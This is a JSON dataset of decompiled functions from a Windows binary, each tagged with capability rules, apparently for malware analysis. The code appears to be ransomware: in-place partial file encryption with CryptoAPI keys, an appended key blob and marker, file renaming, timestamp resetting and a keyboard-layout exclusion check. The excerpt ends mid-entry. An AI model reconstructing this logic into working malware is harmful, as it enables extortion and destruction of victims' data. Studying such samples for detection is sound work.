{
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004011f1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004011f1(uint lpExistingFileName, uint arg_ch, uint lpString2)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint *arg_10h;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint uVar9;\n    uint var_28ch;\n    uint lpCreationTime;\n    uint var_7ch;\n    uint lpLastAccessTime;\n    uint var_74h;\n    uint var_70h;\n    uint32_t var_6ch;\n    int32_t var_68h;\n    uint32_t lpLastWriteTime;\n    uint var_60h;\n    uint32_t lpFileSize;\n    int32_t var_58h;\n    int32_t var_50h;\n    uint32_t var_4ch;\n    uint lpNumberOfBytesRead;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint lpNumberOfBytesWritten;\n    int32_t nNumberOfBytesToWrite;\n    int32_t s2;\n    uint32_t n;\n    uint *lpBuffer;\n    int32_t lpNewFileName;\n    uint32_t hFile;\n    uint var_6h;\n    \n    lpNewFileName = 0;\n    var_6h._0_1_ = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpExistingFileName, 0xc0000000, 0, 0, 3, 0, 0);\n    hFile = uVar2;\n    if (uVar2 == 0xffffffff) goto code_r0x00401745;\n    (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(uVar2, &lpFileSize);\n    if ((*0x42e404 <= var_58h) && ((*0x42e404 < var_58h || (*0x42e400 <= lpFileSize)))) {\n        uVar9 = 0x1f;\n        fcn.004091a1(0xb, 0x1f);\n        uVar5 = arg_ch;\n        uVar9 = fcn.00406209(str._r_I, 8, 0x8783dc99, uVar9, arg_ch, &var_28ch, 0x42f078);\n        fcn.00409428(uVar9, uVar5);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetFileAttributesW;\n        while (iVar3 = (*pcVar8)(lpNewFileName),  iVar3 != -1) {\n            fcn.00406445();\n            lpNewFileName = 0;\n            uVar9 = 0x1f;\n            fcn.004091a1(0xb, 0x1f);\n            uVar5 = arg_ch;\n            uVar9 = fcn.00406209(str._r_I, 8, 0x8783dc99, uVar9, arg_ch, &var_28ch, 0x42f078);\n            fcn.00409428(uVar9, uVar5);\n        }\n        nNumberOfBytesToWrite = 0;\n        lpBuffer = NULL;\n        var_4ch = *0x42e41c;\n        lpNumberOfBytesRead = 0;\n        lpLastWriteTime = lpFileSize - *0x42e430;\n        iVar3 = (var_58h - *0x42e434) - (lpFileSize < *0x42e430);\n        var_6h._1_1_ = 0;\n        if ((iVar3 < 0) || ((iVar3 < 1 && (lpLastWriteTime <= var_4ch)))) {\n            var_34h = lpFileSize & 0xffff;\n        }\n        else {\n            iVar3 = (lpFileSize - var_4ch) - *0x42e430;\n            var_34h = *0x42e41c;\n            nNumberOfBytesToWrite = *0x42e428;\n            puVar4 = sub.ntdll.dll__alldiv\n                               (uVar9, ((var_58h - (lpFileSize < var_4ch)) - *0x42e434) -\n                                       (lpFileSize - var_4ch < *0x42e430), *0x42e428, 0, iVar3);\n            if (*0x42e3f9 < puVar4) {\n                var_6h._1_1_ = *0x42e3f9;\n                lpBuffer = puVar4;\n            }\n            else {\n                var_6h._1_1_ = 1;\n                nNumberOfBytesToWrite = iVar3;\n            }\n        }\n        s2 = 0;\n        if (var_6h._1_1_ != 0) {\n            uVar2 = var_6h._1_1_;\n            s2 = fcn.00406338(0);\n            if (s2 == 0) goto code_r0x0040173b;\n            uVar7 = 0;\n            if (uVar2 != 0) {\ncode_r0x004013ab:\n                do {\n                    iVar3 = fcn.00408a11();\n                    uVar6 = 0;\n                    if (uVar7 != 0) {\n                        do {\n                            if (*(s2 + uVar6 * 8) == iVar3) goto code_r0x004013ab;\n                            uVar6 = uVar6 + 1;\n                        } while (uVar6 < uVar7);\n                    }\n                    *(s2 + uVar7 * 8) = iVar3;\n                    uVar7 = uVar7 + 1;\n                } while (uVar7 < uVar2);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_GetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        puVar4 = fcn.00406338(8);\n        pcVar8 = _sym.imp.KERNEL32.dll_SetFilePointerEx;\n        if (puVar4 != NULL) {\n            lpBuffer = *0x42e414 + 0x17 + puVar4;\n            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, *0x42e430, *0x42e434, 0, 0);\n            var_2ch = var_34h & 0xffff;\n            (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, lpBuffer, var_2ch, &lpNumberOfBytesRead, 0);\n            *(puVar4 + 1) = 0;\n            *(puVar4 + 2) = var_6h._1_1_;\n            *(puVar4 + 9) = nNumberOfBytesToWrite;\n            *puVar4 = 0x52627244;\n            *(puVar4 + 0xf) = *0x42e430;\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n            *(puVar4 + 6) = iVar1 * 2 + 2;\n            *(puVar4 + 0xd) = var_34h;\n            uVar5 = fcn.00406ed8();\n            *(puVar4 + 0x11) = uVar5;\n            *(puVar4 + 0x15) = *0x42e414;\n            fcn.00409681(puVar4 + 0x17);\n            var_28h = 0;\n            if ((var_6h._1_1_ == 0) || (var_28h = fcn.00406338(0),  var_28h != 0)) {\n                n = var_6h._1_1_;\n                var_50h = *(puVar4 + 6) + 0x18 + n * 8;\n                arg_10h = fcn.00406338(0);\n                lpBuffer = arg_10h;\n                if (arg_10h != NULL) {\n                    arg_10h[1] = var_7ch;\n                    *arg_10h = lpCreationTime;\n                    arg_10h[3] = var_74h;\n                    arg_10h[2] = lpLastAccessTime;\n                    arg_10h[5] = var_60h;\n                    arg_10h[4] = lpLastWriteTime;\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(arg_10h + 6, lpString2);\n                    var_30h = 0;\n                    var_70h = fcn.004076f1(puVar4, &var_30h);\n                    if (var_30h != 0) {\n                        var_38h = 0;\n                        if (n != 0) {\n                            var_68h = var_2ch >> 0x1f;\n                            var_6ch = var_2ch;\n                            do {\n                                iVar3 = nNumberOfBytesToWrite;\n                                uVar2 = *(s2 + var_38h * 8) * nNumberOfBytesToWrite;\n                                uVar7 = uVar2 + var_6ch;\n                                var_44h = uVar7 + *0x42e430;\n                                var_40h = var_68h + CARRY4(uVar2, var_6ch) + *0x42e434 + CARRY4(uVar7, *0x42e430);\n                                (*pcVar8)(hFile, var_44h, var_40h, 0, 0);\n                                (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, var_28h, iVar3, &lpNumberOfBytesWritten, 0);\n                                uVar5 = fcn.00406ed8();\n                                uVar2 = var_38h;\n                                *(s2 + 4 + var_38h * 8) = uVar5;\n                                fcn.00406bdd(puVar4 + 0x17, *0x42e414, var_28h, nNumberOfBytesToWrite, 0);\n                                (*pcVar8)(hFile, var_44h, var_40h, 0, 0);\n                                (*_sym.imp.KERNEL32.dll_WriteFile)\n                                          (hFile, var_28h, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n                                var_38h = uVar2 + 1;\n                                arg_10h = lpBuffer;\n                            } while (var_38h < n);\n                        }\n                        sub.ntdll.dll_memcpy(*(puVar4 + 6) + 0x18 + arg_10h, s2, n << 3);\n                        fcn.00406bdd(puVar4 + 0x17, *0x42e414, arg_10h, var_50h, 0);\n                        (*pcVar8)(hFile, *0x42e430, *0x42e434, 0, 0);\n                        n = fcn.00406338(0);\n                        uVar2 = var_2ch;\n                        if (n == 0) {\n                            if (var_34h != 0) {\n                                n = var_2ch;\n                                do {\n                                    var_6h._0_1_ = fcn.00408a11();\n                                    (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, &var_6h, 1, &lpNumberOfBytesWritten, 0);\n                                    n = n - 1;\n                                } while (n != 0);\n                            }\n                        }\n                        else {\n                            fcn.00409681(n);\n                            (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, n, uVar2, &lpNumberOfBytesWritten, 0);\n                            fcn.00406445();\n                            pcVar8 = _sym.imp.KERNEL32.dll_SetFilePointerEx;\n                        }\n                        uVar2 = hFile;\n                        var_44h = 0;\n                        var_40h = 0;\n                        (*pcVar8)(hFile, 0, 0, 0, 2);\n                        pcVar8 = _sym.imp.KERNEL32.dll_WriteFile;\n                        (*_sym.imp.KERNEL32.dll_WriteFile)(uVar2, lpBuffer, var_50h, &lpNumberOfBytesWritten, 0);\n                        (*pcVar8)(uVar2, var_30h, var_70h, &lpNumberOfBytesWritten, 0);\n                        (*pcVar8)(uVar2, *0x42e418, *0x42e3fc, &lpNumberOfBytesWritten, 0);\n                        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar2);\n                        fcn.00403d7c(uVar2);\n                        fcn.00406445();\n                        var_6h._0_1_ = 1;\n                    }\n                    fcn.00406445();\n                }\n                fcn.00406445();\n            }\n            fcn.0040648b();\n        }\n        fcn.00406445();\n    }\ncode_r0x0040173b:\n    uVar2 = fcn.00408489();\ncode_r0x00401745:\n    if (lpNewFileName != 0) {\n        if (var_6h != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_MoveFileW)(lpExistingFileName, lpNewFileName);\n            var_6h._0_1_ = iVar3 != 0;\n        }\n        uVar2 = fcn.00406445();\n    }\n    return uVar2 & 0xffffff00 | var_6h;\n}\n",
        "token_count": 3052
    },
    "00401924": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401924(uint arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t **ppiVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint uVar9;\n    uint uVar10;\n    uint var_5ch;\n    uint32_t *var_58h;\n    uint lpCriticalSection;\n    uint lpSystemInfo;\n    int32_t var_20h;\n    int32_t **var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    var_ch = fcn.00406f78();\n    puVar8 = &var_58h;\n    for (iVar7 = 9; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_5ch = arg_8h;\n    puVar4 = fcn.00406338(0);\n    var_58h = puVar4;\n    uVar5 = fcn.00404fb5();\n    *puVar4 = uVar5;\n    puVar4[1] = *puVar4;\n    uVar5 = fcn.00406338(0);\n    puVar4[2] = uVar5;\n    var_8h = 0;\n    if (arg_10h != 0) {\n        do {\n            ppiVar1 = arg_ch + var_8h * 4;\n            var_10h = ppiVar1;\n            sub.ntdll.dll_memcpy(uVar5, (*ppiVar1)[2], **ppiVar1 << 2);\n            uVar5 = uVar5 + **ppiVar1 * 4;\n            fcn.00406445();\n            fcn.00406445();\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_10h);\n    }\n    fcn.00406445();\n    cVar3 = fcn.00403ed8(arg_8h);\n    if (cVar3 != '\\0') {\n        uVar5 = 0;\n        uVar6 = fcn.00406209(0x412060, 9, 0x24e69194, 0x40000000, 1, 0, 2, 0, 0);\n        arg_10h = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_WriteFile;\n        if (arg_10h != 0xffffffff) {\n            if (*puVar4 != 0) {\n                do {\n                    iVar7 = *(puVar4[2] + uVar5 * 4);\n                    (*pcVar2)(arg_10h, *(iVar7 + 8), *(iVar7 + 0xc) * 2, &arg_8h, 0);\n                    uVar10 = 0;\n                    puVar8 = &arg_8h;\n                    uVar9 = 4;\n                    uVar6 = fcn.00405e30(0x41206c, 4, 0x4e78b818, 0);\n                    (*pcVar2)(arg_10h, uVar6, uVar9, puVar8, uVar10);\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < *puVar4);\n            }\n            fcn.00408489();\n        }\n    }\n    if (*0x42e3fa != '\\0') {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n        fcn.00401136();\n        (*_sym.imp.KERNEL32.dll_Sleep)(3000);\n        iVar7 = 1;\n        if (*0x42e3f8 != '\\0') {\n            (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n            iVar7 = var_20h * 2;\n        }\n        fcn.004011c7();\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            fcn.00406f98(fcn.004017a0, &var_5ch);\n        }\n        fcn.00406fe5();\n        fcn.00401186();\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n        fcn.00407020();\n    }\n    return;\n}\n",
        "token_count": 1022
    },
    "00401d58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401d58(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_14h;\n    int32_t hKey;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar2 = fcn.00405b20();\n    if (uVar2 != '\\0') {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x42e3d8);\n        uVar2 = fcn.00405e30(0x412080, 7, 0x95be8e80, 0);\n        iVar3 = fcn.0040f475(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = fcn.00405e30(0x412080, 7, 0x95be8e80, 0);\n            fcn.0040f475(uVar2);\n            iVar4 = fcn.0040f531();\n            *0x42e3fa = iVar4 != 0;\n            uVar2 = fcn.00405e30(0x412088, 0xb, 0xc3468d8e, 0);\n            fcn.0040f475(uVar2);\n            iVar4 = fcn.0040f531();\n            *0x42e3f8 = iVar4 != 0;\n            uVar2 = fcn.00405e30(0x412094, 0xe, 0x65fc193f, 0);\n            fcn.0040f475(uVar2);\n            iVar3 = fcn.0040f531();\n            if (iVar3 == 0) {\n                iVar3 = 0x10;\n            }\n            *0x42e420 = iVar3 << 0x14;\n            uVar2 = fcn.00405e30(str.__e_, 10, 0x64355b60, 0);\n            fcn.0040f475(uVar2);\n            *0x42e430 = fcn.0040f531();\n            uVar2 = fcn.00405e30(0x4120b0, 10, 0x2cd9498b, 0);\n            fcn.0040f475(uVar2);\n            *0x42e3f9 = fcn.0040f531();\n            if (*0x42e3f9 == 0) {\n                *0x42e3f9 = 1;\n            }\n            uVar2 = fcn.00405e30(0x4120bc, 0xd, 0xe2e75343, 0);\n            fcn.0040f475(uVar2);\n            *0x42e400 = fcn.0040f531();\n            *0x42e428 = *0x42e420 / *0x42e3f9;\n            uVar2 = fcn.00405e30(0x4120cc, 0xc, 0x4024e2ec, 0);\n            fcn.0040f475(uVar2);\n            *0x42e42c = fcn.0040f531();\n            if (*0x42e42c < 0x240) {\n                *0x42e42c = 0x240;\n            }\n            for (; (*0x42e42c & 7) != 0; *0x42e42c = *0x42e42c + 1) {\n            }\n            uVar2 = fcn.00405e30(0x4120dc, 0xc, 0x9273174e, 0);\n            fcn.0040f475(uVar2);\n            *0x42e414 = fcn.0040f531();\n            *0x42e414 = *0x42e414 >> 3;\n        }\n        fcn.00401051(arg_8h);\n        cVar1 = fcn.00401c4a();\n        if (cVar1 == '\\0') {\n            hKey = fcn.004022e8(arg_8h);\n            if (hKey != 0) {\n                fcn.00407428(&var_ch);\n                iVar3 = fcn.00406338(0);\n                var_8h = iVar3;\n                if (iVar3 != 0) {\n                    *0x42e3fc = fcn.004078c5(var_ch, iVar3);\n                    if (*0x42e3fc != 0) {\n                        var_1h._0_1_ = '\\0';\n                        iVar3 = fcn.00402165(hKey, iVar3);\n                        if (iVar3 != 0) {\n                            iVar3 = fcn.00408c74(iVar3, &var_14h);\n                            if (iVar3 != 0) {\n                                fcn.004083cf(iVar3, var_14h, 0x42e43c);\n                                var_1h._0_1_ = fcn.00401b61(iVar3);\n                                fcn.0040648b();\n                            }\n                            fcn.0040648b();\n                            if (var_1h != '\\0') {\n                                iVar3 = fcn.004078c5(*0x42e410, var_8h);\n                                if (iVar3 != 0) {\n                                    fcn.00401b72(var_8h);\n                                }\n                            }\n                        }\n                    }\n                    fcn.0040648b();\n                }\n                fcn.0040786f();\n                fcn.0040786f();\n                (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(hKey);\n            }\n            fcn.00401c4a();\n        }\n        uVar2 = 0;\n        if ((*0x42e410 != 0) && (*0x42e418 != 0)) {\n            uVar2 = 1;\n        }\n    }\n    *0x42e434 = *0x42e430 >> 0x20;\n    *0x42e404 = *0x42e400 >> 0x20;\n    return uVar2;\n}\n",
        "token_count": 1403
    },
    "00402165": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00402165(uint arg_8h, int32_t arg_ch)\n\n{\n    uchar uVar1;\n    uint32_t arg_18h;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t n;\n    uchar *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t s2;\n    int32_t s1;\n    uint var_1h;\n    \n    uVar3 = *0x42e3fc;\n    arg_18h = fcn.00402065(arg_8h);\n    uVar6 = arg_18h - 0xb;\n    uVar7 = uVar3 % uVar6;\n    iVar8 = (uVar7 != 0) + uVar3 / uVar6;\n    var_14h = fcn.00406338(0);\n    uVar3 = *0x42e3fc;\n    if ((var_14h != 0) && (s1 = fcn.00406338(0),  uVar3 = *0x42e3fc,  s1 != 0)) {\n        n = 0;\n        var_10h = var_14h;\n        var_1h._0_1_ = '\\x01';\n        s2 = arg_ch;\n        if (iVar8 != 1) {\n            do {\n                var_20h = uVar6;\n                sub.ntdll.dll_memcpy(s1, s2, uVar6);\n                iVar2 = fcn.004020ff(arg_8h, 0, s1, &var_20h, arg_18h);\n                if (iVar2 == 0) goto code_r0x00402297;\n                uVar3 = 0;\n                if (arg_18h != 0) {\n                    var_18h = (arg_18h - 1) + s1;\n                    do {\n                        uVar1 = *var_18h;\n                        var_18h = var_18h + -1;\n                        *(uVar3 + var_10h) = uVar1;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 < arg_18h);\n                }\n                var_10h = var_10h + var_20h;\n                s2 = s2 + uVar6;\n                n = n + 1;\n            } while (n < iVar8 - 1U);\n        }\n        n = uVar7;\n        if (uVar7 == 0) {\n            n = uVar6;\n        }\n        sub.ntdll.dll_memcpy(s1, s2, n);\n        iVar2 = s1;\n        iVar4 = fcn.004020ff(arg_8h, 1, s1, &n, arg_18h);\n        if (iVar4 == 0) {\n            var_1h._0_1_ = '\\0';\n        }\n        uVar6 = 0;\n        if (arg_18h != 0) {\n            puVar5 = (arg_18h - 1) + iVar2;\n            do {\n                uVar1 = *puVar5;\n                puVar5 = puVar5 + -1;\n                *(uVar6 + var_10h) = uVar1;\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < arg_18h);\n        }\n        uVar3 = iVar8 * arg_18h;\n        if (var_1h == '\\0') {\ncode_r0x00402297:\n            fcn.00406445();\n            fcn.00406445();\n            var_14h = 0;\n            uVar3 = *0x42e3fc;\n        }\n    }\n    *0x42e3fc = uVar3;\n    return var_14h;\n}\n",
        "token_count": 940
    },
    "004022bd": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.004022bd(void)\n\n{\n    if (*0x42e44c == 0) {\n        (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(0x42e44c, 0, 0, 1, 0xf0000000);\n    }\n    return *0x42e44c != 0;\n}\n",
        "token_count": 81
    },
    "00402737": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402737(int32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint extraout_ECX;\n    uint arg_10h;\n    uint lpBuffer;\n    uint var_190h;\n    uint32_t var_18ch;\n    uint lpOutputString;\n    uint var_4h;\n    \n    cVar1 = fcn.00403f4d();\n    var_190h = 0;\n    sub.ntdll.dll_memset(&var_18ch, 0, 0x118);\n    fcn.00409775();\n    if (9 < var_18ch) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    if (cVar1 == '\\0') {\n        fcn.004034d6(in_EAX, 0xffffffff, 1);\n        cVar1 = fcn.00403ed8();\n        if (cVar1 != '\\0') {\n            fcn.00405e30(0x4121cc, 0xf, 0xacea4d1d, 0);\n            uVar2 = fcn.00403ed2();\n            (*_sym.imp.USER32.dll_wsprintfA)(&lpOutputString, extraout_ECX, uVar2);\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(&lpOutputString);\n        }\n        fcn.004043e0(in_EAX);\n    }\n    else {\n        if (arg_ch == '\\0') {\n            fcn.004034d6(in_EAX, 0xffffffff, 1);\n            iVar3 = fcn.004097f5();\n            if (iVar3 != 0) {\n                fcn.00404653();\n            }\n        }\n        else {\n            if (arg_8h < 2) {\n                fcn.004034d6(in_EAX, 0xffffffff, 1);\n            }\n            uVar2 = fcn.00406209(0x4121dc, 0x10, 0x2d65779f);\n            fcn.00408914(uVar2);\n            fcn.0040448b(in_EAX);\n        }\n        cVar1 = fcn.00405074();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00405a63(&var_4h);\n            if (iVar3 != 0) {\n                arg_10h = 1;\n                uVar2 = fcn.00404fb5();\n                fcn.004034d6(in_EAX, uVar2, arg_10h);\n                fcn.00401924(in_EAX, var_4h, iVar3);\n                fcn.004026a5(in_EAX);\n                cVar1 = fcn.00403ed8();\n                if (cVar1 == '\\0') {\n                    (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, &lpBuffer);\n                    fcn.00404cb9(in_EAX, &lpBuffer);\n                }\n                *0x42f17d = 1;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_SetEvent)(*0x42e450);\n    return;\n}\n",
        "token_count": 723
    },
    "00402aba": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00402aba(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint var_68h;\n    uint var_55h;\n    \n    if (*0x42f180 == 0) {\n        puVar1 = fcn.00401adc();\n        fcn.00402a2c();\n        uVar2 = fcn.00405e30(0x412214, 0x20, 0x48b07a8d, 0);\n        fcn.004093eb(&var_68h, uVar2, *puVar1);\n        uVar2 = fcn.00405e30(0x412238, 0x2c, 0x4cd7f472, 0);\n        fcn.00409488(uVar2, var_68h);\n    }\n    return *0x42f180;\n}\n",
        "token_count": 210
    },
    "00403d7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403d7c(uint hFile)\n\n{\n    uint lpSystemTime;\n    uint var_ch;\n    ushort var_8h;\n    ushort var_6h;\n    \n    if (*0x42e3fb == '\\0') {\n        (*_sym.imp.KERNEL32.dll_GetLocalTime)(&lpSystemTime);\n        var_ch._0_2_ = 0;\n        var_ch._2_2_ = 0;\n        var_8h = 0;\n        var_6h = 0;\n        (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, 0x42e990);\n        *0x42e3fb = '\\x01';\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, 0x42e990, 0x42e990, 0x42e990);\n    return;\n}\n",
        "token_count": 209
    },
    "00403dce": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00403dce(uint arg_8h)\n\n{\n    code *pcVar1;\n    ushort uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    uVar3 = fcn.00405e30(0x4123e8, 9, 0x8d9c6e6a, 0);\n    iVar4 = fcn.0040f475(uVar3);\n    if (iVar4 != 0) {\n        uVar3 = fcn.00405e30(0x4123f4, 9, 0x7e9abc71, 0);\n        iVar4 = fcn.0040f475(uVar3);\n        if (iVar4 != 0) {\n            var_8h = fcn.0040f418();\n            var_ch = fcn.00406338(8);\n            uVar7 = 0;\n            if (var_8h != 0) {\n                do {\n                    fcn.0040f43f(uVar7);\n                    uVar2 = fcn.0040f531();\n                    *(var_ch + uVar7 * 2) = uVar2;\n                    uVar7 = uVar7 + 1;\n                } while (uVar7 < var_8h);\n            }\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetKeyboardLayoutList;\n    var_1h._0_1_ = false;\n    iVar4 = (*_sym.imp.USER32.dll_GetKeyboardLayoutList)(0, 0);\n    if ((iVar4 != 0) && (iVar5 = fcn.00406338(0),  iVar5 != 0)) {\n        var_1h._0_1_ = false;\n        uVar7 = (*pcVar1)(iVar4, iVar5);\n        uVar8 = 0;\n        if (uVar7 != 0) {\n            do {\n                uVar6 = 0;\n                if (var_8h != 0) {\n                    do {\n                        if (*(iVar5 + uVar8 * 4) == *(var_ch + uVar6 * 2)) {\n                            var_1h._0_1_ = true;\n                            goto code_r0x00403eb3;\n                        }\n                        uVar6 = uVar6 + 1;\n                    } while (uVar6 < var_8h);\n                }\n                uVar8 = uVar8 + 1;\n            } while (uVar8 < uVar7);\n        }\ncode_r0x00403eb3:\n        var_1h._0_1_ = !var_1h._0_1_;\n        fcn.00406445();\n    }\n    uVar7 = fcn.00406445();\n    return uVar7 & 0xffffff00 | var_1h._0_1_;\n}\n",
        "token_count": 723
    },
    "00403ed8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00403ed8(void)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    int64_t iVar2;\n    \n    if (*0x42f17f == '\\0') {\n        uVar1 = fcn.00406209(0x412400, 0x18, 0x5fffde98);\n        in_EAX = fcn.00409c3f(uVar1);\n        if (in_EAX == 0) {\n            uVar1 = fcn.00405e30(0x41241c, 5, 0xe1ba1d18, 0);\n            fcn.0040f475(uVar1);\n            iVar2 = fcn.0040f531();\n            in_EAX = iVar2 | iVar2 >> 0x20;\n            *0x42f17e = 1;\n            if (iVar2 == 0) {\n                *0x42f17e = 0;\n            }\n        }\n        else {\n            *0x42f17e = 1;\n        }\n        *0x42f17f = '\\x01';\n    }\n    return in_EAX & 0xffffff00 | *0x42f17e;\n}\n",
        "token_count": 272
    },
    "00404539": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
